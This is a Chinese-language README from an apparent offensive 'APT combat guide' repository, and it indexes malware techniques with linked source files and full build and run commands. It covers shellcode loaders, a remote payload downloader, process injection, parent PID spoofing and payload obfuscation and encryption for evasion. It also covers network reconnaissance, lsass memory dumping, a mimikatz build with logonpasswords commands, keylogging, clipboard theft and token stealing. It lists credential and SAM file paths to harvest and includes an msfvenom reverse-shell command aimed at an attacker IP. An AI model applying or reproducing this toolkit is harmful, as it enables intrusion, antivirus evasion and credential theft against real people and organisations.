# 恶意软件技巧

## 加载器

### 下载远程恶意文件

[wolf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/wolf.cpp)

```bash
x86_64-w64-mingw32-g++ -shared -o wolf.dll wolf.cpp -fpermissive
```

[download.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/download.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 download.cpp -o download.exe -mconsole -lwininet -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
.\download.exe 进程PID
```

### Shellcode加载

1. EnumDesktopsA函数

```bash
msfvenom -p windows/x64/messagebox TEXT="Hello, World" -f c
```

[enumdesktopa.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/enumdesktopa.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 enumdesktopa.cpp -o enumdesktopa.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
````

2. EnumChildWindows函数

[ecw.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/ecw.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ecw.cpp -o ecw.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

3. Listplanting函数

[llcalc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/llcalc.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 llcalc.cpp -o llcalc.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

4. EnumerateLoadedModules函数

[elm.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E5%8A%A0%E8%BD%BD%E5%99%A8/elm.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 elm.cpp -o elm.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ldbghelp
```

## 系统调用

[sycall.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8/sycall.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 sycall.cpp -o sycall.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 枚举进程并注入

### 单独枚举进程

[枚举进程.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/枚举进程.cpp)


### NtGetNextProcess函数

[ngnp.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/ngnp.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 ngnp.cpp -o ngnp.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwap
```

### WTSEnumerateProcesses函数

[wtsep.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%9E%9A%E4%B8%BE%E8%BF%9B%E7%A8%8B%E5%B9%B6%E6%B3%A8%E5%85%A5/wtsep.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 wtsep.cpp -o wtsep.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -lpsapi -lshlwap
```

## 父进程PID欺骗

### explorer进程

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者IP地址 LPORT=4444 -f c
```

[exp.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%88%B6%E8%BF%9B%E7%A8%8BPID%E6%AC%BA%E9%AA%97/exp.cpp)

### 自定义父进程

[custom.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E7%88%B6%E8%BF%9B%E7%A8%8BPID%E6%AC%BA%E9%AA%97/custom.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 custom.cpp -o custom.exe -mwindows -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 互斥锁

[mutex.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BA%92%E6%96%A5%E9%94%81/mutex.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mutex.cpp -o mutex.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 代码混淆和加密

### 混淆技术

1. 重命名

[script.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/script.py)

```bash
python script.py example.txt old new
```

2. 控制流混淆

(1)条件控制流混淆

[number.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/number.py)

[tj.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/tj.py)

(2)控制流平坦化

[cff.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/cff.py)

```bash
pip install astor
```

[flatten.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/flatten.py)

```bash
python flatten.py cff.py
```

(3)不透明谓词

[example.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/example.py)

[op.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/op.py)

### 加密技术

1. XOR加密

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f raw -o evil.bin
```

[xor_encode.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/xor_encode.py)

[xor.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/xor.cpp)

```bash
x86_64-w64-mingw32-gcc xor.cpp -o xor.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc >/dev/null 2>&1
```

2. Z85加密

```bash
msfvenom -p windows/x64/messagebox TEXT='Hi,I am Snowwolf' TITLE='Ghost Wolf Lab' -f c
```

[z85_encode.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/z85_encode.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 z85_encode.cpp -o z85_encode.exe -I/usr/share/mingw-w64/include/ -I/usr/include/z85/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[z85.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/z85.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 z85.cpp -o z85.exe -I/usr/share/mingw-w64/include/ -I/usr/include/z85/ -L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

3. RC5加密

[rc5.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/rc5.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 rc5.cpp -o rc5.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

4. RC6加密

[rc6.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/rc6.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 rc6.cpp -o rc6.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

5. DES加密

[des.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/des.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 des.cpp -o des.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

6. TEA加密

[tea.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/tea.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 tea.cpp -o tea.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

7. XTEA加密

[xtea.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/xtea.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 xtea.cpp -o xtea.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

8. Madryga加密

[madryga.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/madryga.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 madryga.cpp -o madryga.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

9. A5/1算法

[a5.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/a5.cpp)

```bash
86_64-w64-mingw32-gcc -O2 a5.cpp -o a5.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

10. Skipjack加密

[skipjack.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/skipjack.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 skipjack.cpp -o skipjack.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

11. WAKE加密

[wake.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/wake.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 wake.cpp -o wake.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

12. SAFER加密

[safer.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/safer.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 safer.cpp -o safer.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

13. LOKI加密

[loki.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/loki.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 loki.cpp -o loki.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

14. Khufu加密

[khufu.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/khufu.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 khufu.cpp -o khufu.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

15. CAST-128加密

[cast.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/cast.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 cast.cpp -o cast.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

16. FEAL-8加密

[feal.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/feal.cpp)

```bash
x86_64-w64-mingw32-gcc -O2 feal.cpp -o feal.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

17. 模乘运算加密

[mc_encode.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/mc_encode.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mc_encode.cpp -o mc_encode.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

[mc_encode.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/mc_encode.py)

[mc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%8A%A0%E5%AF%86/mc.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mc.cpp -o mc.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

## 横向移动

### 侦察

#### 网络扫描

1. 获取网络适配器信息

[GetAdaptersInfo.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/GetAdaptersInfo.cpp)

2. 枚举网络资源

[WNetEnumResourceA](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/WNetEnumResourceA.cpp)

3. 枚举子网存活主机

[枚举子网存活主机](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举子网存活主机.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
```

4. 开放端口扫描

[开放端口扫描](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/开放端口扫描.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
.\.exe可执行程序 IP地址 1 100 20
```

#### 服务枚举

1. 枚举网络类型的提供程序名称

[枚举网络类型的提供程序名称](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举网络类型的提供程序名称.cpp)

2. 枚举服务

[枚举服务](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举服务.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
.\.exe可执行程序 IP地址 1 100 20
```

#### 流量分析

[监听流量](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/监听流量.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
.\.exe可执行程序 监听协议 IP地址 80
```

#### 枚举进程

[枚举进程](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举进程.cpp)

```bash
cl /EHsc /D WIN32 /D _CONSOLE /D _UNICODE /D UNICODE .cpp文件 /link ws2_32.lib iphlpapi.lib
.\可执行程序 进程名称
```

#### 枚举文件

+	用户凭证：存储在C:\Users\<username>\AppData\Local\Microsoft\Credentials和C:\Users\<username>\AppData\Roaming\Microsoft\Credentials中的文件。
+	浏览器密码：存储在浏览器配置文件中的密码，如Google Chrome的Login Data文件。
+	系统配置文件：如C:\Windows\System32\config\SAM（安全帐户管理数据库）和C:\Windows\System32\config\SYSTEM（系统配置）。
+	应用程序配置文件：如IIS的配置文件C:\Windows\System32\inetsrv\config\applicationHost.config。
+	启动脚本：存储在C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup和C:\Windows\System32\GroupPolicy\User\Scripts\Logon中的脚本。
+	任务计划脚本：存储在C:\Windows\System32\Tasks中的任务计划脚本。
+	日志文件：如C:\Windows\System32\winevt\Logs中的事件日志文件。
+	注册表项：如HKEY_LOCAL_MACHINE\SYSTEM和HKEY_LOCAL_MACHINE\SOFTWARE中的注册表项，包含系统和应用程序的配置信息。

[枚举文件](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举文件.cpp)

```bash
.\exe可执行程序 文件名 D:\
```

#### 注册表枚举

+	系统启动项：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run和HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run。
+	网络配置：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters。
+	用户账户信息：HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users。
+	用户最近使用的文件：HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs。
+	已安装的软件列表：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall和HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Uninstall
+	应用程序设置：HKEY_CURRENT_USER\Software（包含用户安装的应用程序的配置信息）。
+	浏览器历史记录和缓存：HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\TypedURLs和HKEY_CURRENT_USER\Software\Google\Chrome\PreferenceMACs。
+	远程桌面连接信息：HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default。

[注册表枚举](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/注册表枚举.cpp)

```bash
.\可执行程序.exe HKEY_LOCAL_MACHINE SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
```

#### 枚举系统信息

[枚举系统信息](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举系统信息.cpp)

[枚举系统设备驱动程序](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举系统设备驱动程序.cpp)

[枚举磁盘卷空间信息](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举磁盘卷空间信息.cpp)

### 凭证收集

1. 内存抓取

[抓取lsass.exe内存数据](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/抓取lsass.exe内存数据.cpp)

[解码内容](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/解码内容.py)

[指定进程内存抓取](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/指定进程内存抓取.cpp)

[mimikatz](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/mimikatz.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 mimikatz.cpp -o mimikatz.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ldbghelp
```

```bash
.\mimikatz.exe
sekurlsa::minidump c:\temp\lsass.dmp
sekurlsa::logonpasswords
```

2. 键盘记录

[键盘记录](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/键盘记录.cpp)

3. 剪切板窃取

[剪切板窃取](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/剪切板窃取.cpp)

4. 网络嗅探

[枚举主机系统的Internet缓存](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/枚举主机系统的Internet缓存.cpp)


### 令牌窃取

1. 复制令牌

[dup_token.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/dup_token.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 dup_token.cpp -o dup_token.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
Get-Process winlogon
dup_token.exe PID
```

2. 继承令牌

[i_token.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/i_token.cpp)

```bash
x86_64-w64-mingw32-g++ -O2 i_token.cpp -o i_token.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

```bash
Get-Process winlogon
i_token.exe PID
```

### 远程执行

